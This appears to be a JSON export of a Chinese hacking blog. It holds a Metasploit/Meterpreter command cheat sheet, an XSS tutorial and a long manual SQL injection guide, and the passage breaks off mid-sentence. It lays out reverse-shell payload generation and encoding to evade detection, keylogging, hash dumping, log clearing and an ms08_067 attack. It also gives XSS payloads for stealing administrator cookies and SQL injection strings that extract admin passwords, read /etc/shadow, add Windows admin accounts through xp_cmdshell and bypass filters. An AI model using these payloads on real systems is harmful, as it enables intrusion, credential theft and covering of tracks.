{"meta":{"title":"小瑞安全博客","subtitle":"喜欢安全的95后苦逼青年！","description":null,"author":"小瑞安全博客","url":"http://www.hackerui.me"},"pages":[{"title":"","date":"2017-04-19T01:53:31.225Z","updated":"2017-04-19T01:53:31.225Z","comments":true,"path":"404.html","permalink":"http://www.hackerui.me/404.html","excerpt":"","text":"404"},{"title":"categories","date":"2017-05-09T01:29:25.147Z","updated":"2017-04-17T11:22:22.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.hackerui.me/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2017-05-09T02:00:02.214Z","updated":"2017-05-09T02:00:02.214Z","comments":true,"path":"tags/index.html","permalink":"http://www.hackerui.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Metasploit(MSF)终端命令大全","slug":"MSF","date":"2017-07-04T03:09:25.000Z","updated":"2017-07-04T03:25:52.739Z","comments":true,"path":"2017/07/04/MSF/","link":"","permalink":"http://www.hackerui.me/2017/07/04/MSF/","excerpt":"","text":"show exploits列出metasploit框架中的所有渗透攻击模块。show payloads列出metasploit框架中的所有攻击载荷。show auxiliary列出metasploit框架中的所有辅助攻击载荷。search name查找metasploit框架中所有的渗透攻击和其他模块。info展示出制定渗透攻击或模块的相关信息。use name装载一个渗透攻击或模块。LHOST你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。RHOST远程主机或是目标主机。set function设置特定的配置参数（EG：设置本地或远程主机参数）。setg function以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。show options列出某个渗透攻击或模块中所有的配置参数。show targets列出渗透攻击所有支持的目标平台。set target num指定你所知道的目标的操作系统以及补丁版本类型。set payload name指定想要使用的攻击载荷。show advanced列出所有高级配置选项。set autorunscript migrate -f.在渗透攻击完成后，将自动迁移到另一个进程。check检测目标是否选定渗透攻击存在相应的安全漏洞。exploit执行渗透攻击或模块来攻击目标。exploit -j在计划任务下进行渗透攻击（攻击将在后台进行）。exploit -z渗透攻击完成后不与回话进行交互。exploit -e encoder制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。exploit -h列出exploit命令的帮助信息。sessions -l列出可用的交互会话（在处理多个shell时使用）。sessions -l -v列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。sessions -s script在所有活跃的metasploit会话中运行一个特定的metasploit脚本。sessions -K杀死所有活跃的交互会话。sessions -c cmd在所有活跃的metasploit会话上执行一个命令。sessions -u sessionID升级一个普通的win32 shell到metasploit shell。db_create name创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。db_connect name创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。db_namp利用Nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。db_autopwn -h展示出db_autopwn命令的帮助信息。db_autopwn -p -r -e对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。db_destroy删除当前数据库。db_destroy user：passwd@host：port/database使用高级选项来删除数据库。metasploit命令help打开meterpreter使用帮助。run scriptname运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。sysinfo列出受控主机的系统信息。ls列出目标主机的文件和文件夹信息。use priv加载特权提升扩展模块，来扩展metasploit库。ps显示所有运行的进程以及相关联的用户账户。migrate PID迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。use incognito加载incognito功能（用来盗窃目标主机的令牌或假冒用户）list_tokens -u列出目标主机用户的可用令牌。list_tokens -g列出目标主机用户组的可用令牌。impersonate_token DOMAIN_NAME\\USERNAME假冒目标主机上的可用令牌。steal_token PID盗窃给定进程的可用令牌并进行令牌假冒。drop_token停止假冒当前令牌。getsystem通过各种攻击向量来提升系统用户权限。execute -f cmd.exe -i执行cmd.exe命令并进行交互。execute -f cmd.exe -i -t以所有可用令牌来执行cmd命令并隐藏该进程。rev2self回到控制目标主机的初始用户账户下。reg command在目标主机注册表中进行交互，创建，删除，查询等操作。setdesktop number切换到另一个用户界面（该功能基于那些用户已登录）。screenshot对目标主机的屏幕进行截图。upload file向目标主机上传文件。download file从目标主机下载文件。keyscan_start针对远程目标主机开启键盘记录功能。keyscan_dump存储目标主机上捕获的键盘记录。keyscan_stop停止针对目标主机的键盘记录。getprivs尽可能多的获取目标主机上的特权。uictl enable keyboard/mouse接管目标主机的键盘和鼠标。background将你当前的metasploit shell转为后台执行。hashdump导出目标主机中的口令哈希值。use sniffer加载嗅探模式。sniffer_interfaces列出目标主机所有开放的网络端口。sniffer_dump interfaceID pcapname在目标主机上启动嗅探。sniffer_start interfaceID packet-buffer在目标主机上针对特定范围的数据包缓冲区启动嗅探。sniffer_stats interfaceID获取正在实施嗅探网络接口的统计数据。sniffer_stop interfaceID停止嗅探。add_user username password -h ip在远程目标主机上添加一个用户。clearev清楚目标主机上的日志记录。timestomp修改文件属性，例如修改文件的创建时间（反取证调查）。reboot重启目标主机。msfpayload命令msfpayload -hmsfpayload的帮助信息。msfpayload windows/meterpreter/bind_tcp O列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。msfencode命令mefencode -h列出msfencode的帮助命令。msfencode -l列出所有可用的编码器。msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)显示编码缓冲区的格式。msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe创建一个经过多种编码格式嵌套编码的攻击载荷。msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。MSFcli命令msfcli | grep exploit仅列出渗透攻击模块。msfcli | grep exploit/windows仅列出与windows相关的渗透攻击模块。msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://www.hackerui.me/tags/渗透/"}]},{"title":"喜欢的音乐","slug":"音乐","date":"2017-06-20T06:18:28.000Z","updated":"2017-07-04T03:10:58.530Z","comments":true,"path":"2017/06/20/音乐/","link":"","permalink":"http://www.hackerui.me/2017/06/20/音乐/","excerpt":"","text":"","categories":[],"tags":[{"name":"休闲","slug":"休闲","permalink":"http://www.hackerui.me/tags/休闲/"}]},{"title":"xss原理分析","slug":"xss原理分析","date":"2017-05-09T05:12:11.000Z","updated":"2017-05-09T05:40:15.965Z","comments":true,"path":"2017/05/09/xss原理分析/","link":"","permalink":"http://www.hackerui.me/2017/05/09/xss原理分析/","excerpt":"xss原理分析 0×01 前言: XSS的原理分析与解剖","text":"xss原理分析 0×01 前言: XSS的原理分析与解剖《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下： 1、耗时间2、有一定几率不成功3、没有相应的软件来完成自动化攻击4、前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底5、是一种被动的攻击手法6、对website有http-only、crossdomian.xml没有用但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个。 Xss几乎每个网站都存在，google、baidu、360等都存在。 0×02 原理: 首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php $xss = $_GET[&apos;xss_input&apos;]; echo &apos;你输入的字符为&lt;br&gt;&apos;.$xss; ?&gt; &lt;/body&gt; &lt;/html&gt; 然后，你会在页面看到这样的页面 我们试着输入abcd123，得到的结果为 我们在看看源代码 我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入下面的代码会出现什么呢？1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 如果按照上面的例子来说，它应该存在第12行的[br]与[/boby]&gt;之间，变成：1&lt;br&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;/boby&gt; 之后，应该会弹出对话框。 既然假设提出来，那我们来实现下这个假设成不成立吧。 我们输入1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 得到的页面为 成功弹窗，这个时候基本上就可以确定存在xss漏洞。 我们在看看源代码 看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用。 0×03 xss利用输出的环境来构造代码 : 上节说了xss的原理，但是我们的输出点不一在[ br ]和[ /boby ]里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入下面代码就会出现弹窗。1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 先贴出代码:12345678910111213141516171819202122232425&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php $xss = $_GET[&apos;xss_input_value&apos;]; if(isset($xss))&#123; echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;; &#125;else&#123; echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;; &#125; ?&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; 下面是代码的页面 这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入下面的代码来测试)1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码 我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在1&lt;script&gt;alert(&amp;#039;xss&amp;#039;)&lt;/script&gt; 前面加个”&gt;来闭合input标签。所以应该得到的结果为 成功弹窗了，我们在看看这时的页面 看到后面有第二个input输入框后面跟有”&gt;字符串，为什么会这样呢，我们来看看源代码 这时可以看到我们构造的代码里面有两个”&gt;，第一个”&gt;是为了闭合input标签，所以第二个”&gt;就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？ 这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。 还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成 “ onclick=”alert(&#039;xss&#039;)这时，我们在来试试，页面会发生什么样的变化吧。 没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行alert(&#039;xss&#039;)代码。我们来试试看 当我点击后，就出现了弹窗，这时我们来看看源代码吧 第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成 Onmousemove 当鼠标移动就触发 Onload 当页面加载完成后触发 还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。 别以为就这样结束了，还有一类环境不能用上述的方法， 那就是如果在[ textarea ]标签里呢？！或者其他优先级比script高的呢？ 就下面这样 这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入下面的代码就可以实现弹窗了。1&lt;/textarea&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 0×04 过滤的解决办法 假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写1234&lt;img scr=1 onerror=alert(&apos;xss&apos;)&gt;当找不到图片名为1的文件时，执行alert(&apos;xss&apos;) &lt;a href=javascrip:alert(&apos;xss&apos;)&gt;s&lt;/a&gt; 点击s时运行alert(&apos;xss&apos;) &lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe的scr来弹窗 &lt;img src=&quot;1&quot; onerror=eval(&quot;\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29&quot;)&gt;&lt;/img&gt;过滤了alert来执行弹窗 等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还有管他…) 0×05 xss的利用 说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。 这时我们要插入js代码了，怎么插呢？ 你可以这样1&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt; 也可以这样1&lt;img src=x onerror=appendChild(createElement(&apos;script&apos;)).src=&apos;js_url&apos; /&gt; 各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？ Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。 比如我们在网站的留言区输入下面的代码：1&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt; 当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。 至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。 有兴趣的朋友，下面是cn4rry给我的几个xss平台，大家可以自己钻研与研究，也可以自己搭建 http://pan.baidu.com/s/1ntqOp4X 在发布此文章的时候，我特地和cn4rry谈了一下，得到的结果是，我会继续写这个系列的。当我把这个doc发给cn4rry的时候，他就直接来句“嗯 写的比较基础”，我本来的打算是写一个xss入门的就可以了，我只是感觉 现在网上的文章从简单开始介绍xss的比较少，都是在书里有 所以 我想在网上把他讲的细点 xss入门就可以了，后面的路 就可以自己摸索了 但是和他谈过后，感觉还是要继续写下去，因为“xss盲打”“xss编码绕过”“fuzzing xss”等等，如果是自己慢慢琢磨的话，需要较长的时间，所以我打算每过一段时间就会推出下一个xss的文章，写个系列出来。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://www.hackerui.me/tags/渗透/"}]},{"title":"手工注入","slug":"手工注入","date":"2017-05-09T03:14:19.000Z","updated":"2017-05-09T05:00:41.587Z","comments":true,"path":"2017/05/09/手工注入/","link":"","permalink":"http://www.hackerui.me/2017/05/09/手工注入/","excerpt":"手工注入总结 注意，是注入，不单单是SQL，还牵扯到了一些Oracle，嗯，asp、PHP都涉及到了，还有绕过防注入、偏移注射、跨库查询，甚至在后边还说的有提权，可能你在看这篇文章的前一部分的时候会觉得很多你都看过了，但是，不要着急，后面的你应该是没看过的，嘿嘿，整合了多家资源，也加了一点点（注意是一点点，跟这些牛们不敢相提并论的）自己的想法，总体感觉，还可以吧。另外，也奉劝那些整天拿着啊D、明小子、NBSI狂扫的同学，多学点基础不会对你有坏处，如果底子不好，那以后的路是走不了多远的，按某牛的话说，撑死了也就是个ScriptBoy，成不了大气候，所以，还是静下心来专心做学问比较好。","text":"手工注入总结 注意，是注入，不单单是SQL，还牵扯到了一些Oracle，嗯，asp、PHP都涉及到了，还有绕过防注入、偏移注射、跨库查询，甚至在后边还说的有提权，可能你在看这篇文章的前一部分的时候会觉得很多你都看过了，但是，不要着急，后面的你应该是没看过的，嘿嘿，整合了多家资源，也加了一点点（注意是一点点，跟这些牛们不敢相提并论的）自己的想法，总体感觉，还可以吧。另外，也奉劝那些整天拿着啊D、明小子、NBSI狂扫的同学，多学点基础不会对你有坏处，如果底子不好，那以后的路是走不了多远的，按某牛的话说，撑死了也就是个ScriptBoy，成不了大气候，所以，还是静下心来专心做学问比较好。一、判断是否可以注入： 单引号但如果单引号测试出错，是可以试试and 1=1的，因为一些对SQL注入有一点了解的程序员认为只要把单引号过滤掉就可以了 传入参数为数字型时：and 1=1and 1=2可以注入的提示：BOF或EOF，程序未做任何判断提示找不到记录，判断了rs.eof显示内容为空，程序加了on error resume next不可注入的提示：类型转换时出错其他自定义的出错提示注：其实只要两次返回页面不同，基本上都是可以注入的。 传入参数不为数字型时，需要变动一下比如：asp?id=aeo’ and ‘1’=’1asp?id=aeo’ and ‘1’=’2二、判断数据库类型1.And user&gt;0user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个 nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示是：将nvarchar值 ”abc” 转换数据类型为 int 的列时发生语法错误，abc正是变量user的值，这样，不废吹灰之力就拿到了数据库的用户名。这样就可以判断是否为SQLServer数据库或Access,前提是IIS错误提示未关闭，并且SQL返回错误提示2.sysobjects和msysobjectsSysobjects是SQL的内置系统表，在WEB下可以正常读取，msysobjects是Access的内置系统表，在WEB下无权读取。那么就可以输入and (select count() from sysobjects)&gt;0或and (select count() from msysobjects)&gt;0这两句随便输入一句即可判断。也可以提交;and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–如果显示正常，说明是SA3.在注入点后加上：;–一个分号两个横线，如果页面返回正常的话，说明数据库是MSSQL，因为在MSSQL数据库里，;和–都是存在的，”;” 用来分离两个语句，而”–”就是注释符，在它后面的语句都不执行，而ACCESS数据库里没有。4.高级数据库类型判断方法某日，发现一目标存在SQL注入，且过滤了select等相关敏感字段，用工具暂无法判断数据库类型。后发现调用某些SQL函数也可判断数据库类型，虽然SQL语句大部分是通用的。但一些内置的函数还是有一定的区别。len和length在mssql和MySQL以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。换句话说。当你使用and len(‘a’)=1的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或mysql，或是db2。反之则可能会是oracle和informix。@@version和version()在mysql内，可以用@@version或是version()来返回当前的版本信息。但无法判断是mysql还是mssql时，可以用version()函数来构造判断。换句话说：version()&gt;1 返回与@@version&gt;1 相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。substring和substr在mssql中可以调用substring。oracle则只可调用substrSUBSTRING(‘abc’,1,1)=a 返回成功，刚可能是mssql。使用substr(‘abc’,1,1)=a 返回成功，则可能为oracle5、阿呆的判断数据库的方法原文在阿呆的博客里有http://www.xxxx.com/infoshow.php?id=251/**//*提交这样的地址，返回正常，说明是MYSQL阿呆是这么说的，我没弄明白原理 三、猜表名1.And (Select Count() from Admin)&gt;=0如果页面正确，则admin表存在，反之则不存在2.and exists (select from admin)如果页面正确，则admin表存在，反之则不存在 and 0&lt;&gt;(select count(*) from admin)如果页面正确，则admin表存在，反之则不存在 and (select count(*) from admin)&gt;2判断该表内有几条记录，也就是判断有几个管理员四、猜字段 And (Select Count(字段名) from Admin)&gt;=0如果页面正确，则admin表中的相应字段存在，反之则不存在2.and exists (select 字段名 from admin)如果页面正确，则admin表中的相应字段存在，反之则不存在 and 1=(select count() from admin where len(username)&gt;0)如果页面正确，则admin表中的相应字段存在，反之则不存在五、猜内容可以分为两种情况，一种是支持联合查询，另外是不支持联合查询阿呆的判断是否支持联合查询的方法：http://www.xxxx.com/infoshow.php?id=251/**/and/**/ord(mid(version(),1,1))&gt;51/页面正常则说明支持在mysql中 有很多的注射能用到的函数 比如 user() database() version() 分别用来查看当前数据库连接的用户名，数据库名称 以及mysql的版本，这些函数可以直接用于显示位里，比如：http://www.xxxx.com/infoshow.php?id=251/**/and/**/1=2%20union%20select%201,user(),3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18/*这样就返回了相应的信息。那么可能就有人会说，我要他这几个函数得到的信息怎么利用呢？下面是答案：如果当前连接数据库的用户是 root的话 可以尝试使用 loadfile()函数来查看文件内容，不过前提是要知道文件的绝对路径，至于绝对路径需要我们通过不同的手段来拿到。穿插一点：php+mysql注入中load_file()函数的应用注入的过程中 如果当前数据库连接用户为root或者具有root权限就可以尝试使用这个函数来读取文件 比如在Linux下我们可以读取 /etc/passwd 和/etc/shadow来暴力破解linux密码在windows下 我们可以读取 一些常见的文件以及敏感的地方比如 serv-u的配置文件 my.ini等等刚才我们已经爆出了当前数据库连接的用户名root@localhost查看下 c:\\boot.ini 这里假设是windows系统 其实就是windows系统格式是这样的 load_file(0x+文件绝对路径的16进制)我们先用工具转换下 刚才的断了 我们继续 我一直用这个工具转换c:\\boot.ini转换成16进制是633A5C626F6F742E696E69我们load_file()看看,输入union+select+1,2,3,load_file(0x633A5C626F6F742E696E69),5,6,7,8,9,10，如图十三额，说一下，这个图我给和谐掉了，因为这篇文章都是文字，这里出来一个图，发的时候不好发，所以就给和谐了，但是不影响理解的，只是看不到实效罢了，我们完全可以在自己的实践中来运用。可以看出来，boot.ini已经被读出来了，上次问YoCo，他说是可以加载任意文件的，只要你知道路径，记得原来看过一个专门说load_file的文章，忘了扔哪去了，这次整理资料也找不到了，叹一个，YoCo你要看到这篇文章的话帮忙想一下，我记得好像是你给我的文章地址…还有个技巧，在WIN下load_file(‘C:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml’) 可了解IIS配置 在无法获得路径的情况下是个不错的方法 1、支持联合查询A、判断该页面字段数，并得到显示位有两种方法，一种是：And 1=2 union select 1,2,3,4…直到页面显示正确需要注意的是，这种方法有时需要将这些数字换成null另一种是用order byOrder by 10显示正确则字段数大于10，反之则不大于B、爆出用户名和密码And 1=2 union select 1,2,3,4,username,5,6,7 from admin这样就直接爆出了用户名，然后再爆出密码即可。需要注意的是，如果是PHP注入，则需要将上面的语句换成：And 1=2+union+select+1,2,3,4,concat(username),5,6,7+from+admin上面的语句也可以换成：And 1=2//union//select//1,2,3,4,concat(username),5,6,7//from/*/admin/那么，我们这个方法是取的数据库中的第一列的数据来输出的，那么，如果这个网站有多个管理员，我们想得到第二个管理员的信息，这时候该怎么办呢？这个时候我们可以使用判断语句来查询不同的管理员的用户名和密码，在管理员表中一般都有个id字段，我们可以用这个字段的值来查询不同的管理员信息，一般的都是 从1开始的，（当然，也存在不是从一开始的情况，那个时候就需要我们慢慢猜一下了）and+1=2+union+select+1,username,3,password,5,6,7,8,9,10+from+users+where+id=2这样，第一列的管理员的id是1的话，我们让id等于2，这样就取出了第二个管理员的信息。2、不支持联合查询这样的话就只好一位一位的猜了首先，测试字段内记录的长度and (select top 1 len(username) from Admin)&gt;0拿出username中的第一条记录，判断长度是否大于0，大于，则显示正确，反之，不大于也可以and 1=(select count(*) from admin where len(username)=5)显示正常说明username的内容等于5，一般为admin，换掉5的值即可判断出该字段的长度。取得长度后，用mid(username,N,1)截取第N位字符，再asc(mid(username,N,1))得到ASCII码，如and (select top 1 asc(mid(username,1,1)) from Admin)&gt;0拿出username中的第一条记录中的第一个字符的ASC码，并判断其值是否大于0，改变0值即可判断出该字符的ASC码大小，然后再转换得到真实字符。英文和数字的ASCII码在1-128之间。中文处理办法：Access中，中文的ASCII码可能会出现负数，取出该负数后用abs()取绝对值，汉字字符不变。SQLServer中，中文的ASCII为正数，但由于是UNICODE的双位编码，不能用函数ascii()取得ASCII码，必须用函数unicode ()返回unicode值，再用nchar函数取得对应的中文字符。了解了上面的两点后，是不是觉得中文猜解其实也跟英文差不多呢？除了使用的函数要注意、猜解范围大一点外，方法是没什么两样的。 六、SQL的一些函数有SQL语言基础的人，在ＳＱＬ注入的时候成功率比不熟悉的人高很多。我们有必要提高一下自己的SQL水平，特别是一些常用的函数及命令。Access：asc(字符) SQLServer：unicode(字符)作用：返回某字符的ASCII码Access：chr(数字) SQLServer：nchar(数字)作用：与asc相反，根据ASCII码返回字符Access：mid(字符串,N,L) SQLServer：substring(字符串,N,L)作用：返回字符串从N个字符起长度为L的子字符串，即N到N+L之间的字符串Access：abc(数字) SQLServer：abc (数字)作用：返回数字的绝对值（在猜解汉字的时候会用到）Access：A between B And C SQLServer：A between B And C作用：判断A是否界于B与C之间 七、SQL高级注入SQLServer是一个功能强大的数据库系统，与操作系统也有紧密的联系，这给开发者带来了很大的方便，但另一方面，也为注入者提供了一个跳板，我们先来看看几个具体的例子：① http://Site/url.asp?id=1;exec master..xp_cmdshell “net user name password /add”–分号;在SQLServer中表示隔开前后两句语句，–表示后面的语句为注释，所以，这句语句在SQLServer中将被分成两句执行，先是Select出ID=1的记录，然后执行存储过程xp_cmdshell，这个存储过程用于调用系统命令，于是，用net命令新建了用户名为name、密码为password的windows的帐号，接着：② http://Site/url.asp?id=1;exec master..xp_cmdshell “net localgroup name administrators /add”–将新建的帐号name加入管理员组，不用两分钟，你已经拿到了系统最高权限！当然，这种方法只适用于用sa连接数据库的情况，否则，是没有权限调用xp_cmdshell的。③ http://Site/url.asp?id=1 ;and db_name()&gt;0前面有个类似的例子and user&gt;0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。④ http://Site/url.asp?id=1;backup database 数据库名 to disk=’c:\\inetpub\\wwwroot\\1.db’;–这是相当狠的一招，从③拿到的数据库名，加上某些IIS出错暴露出的绝对路径，将数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！在不知道绝对路径的时候，还可以备份到网络地址的方法（如\\202.96.xx.xx\\Share \\1.db），但成功率不高。⑤ http://Site/url.asp?id=1 ;and (Select Top 1 name from sysobjects where xtype=’U’ and status&gt;0)&gt;0前面说过，sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype=’U’ and status&gt;0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。第二、第三个表名怎么获取？还是留给我们聪明的读者思考吧。⑥ http://Site/url.asp?id=1 ;and (Select Top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0从⑤拿到表名后，用object_id(‘表名’)获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4…就可以逐个获取所猜解表里面的字段名。⑦asp?id=1;update admin set password= ‘新MD5密码’ where password= ‘旧MD5密码’ –这句更狠，用于解不出MD5的情况，直接把密码给替换掉了，但是只能用于SQL数据库，admin为表名 八、绕过程序限制继续注入1、如where xtype=’U’，字符U对应的ASCII码是85，所以可以用where xtype=char(85)代替；如果字符是中文的，比如where name=’用户’，可以用where name=nchar(29992)+nchar(25143)代替。2、运用编码技术绕过如URLEncode编码，ASCII编码绕过。例如or 1=1即%6f%72%20%31%3d%31而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)3、通过空格绕过如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如or’ swords’ =‘swords’，由于mssql的松散性，我们可以把or ‘swords’ 之间的空格去掉，并不影响运行。4、运用字符串判断代替用经典的or 1=1判断绕过,如or ‘swords’ =’swords’这个方法就是网上在讨论的。5、通过类型转换修饰符N绕过可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or ‘swords’ = N’ swords’，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。6、通过+号拆解字符串绕过效果值得考证，但毕竟是一种方法。如or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )7、通过LIKE绕过8、以前怎么就没想到呢？如or’swords’ LIKE 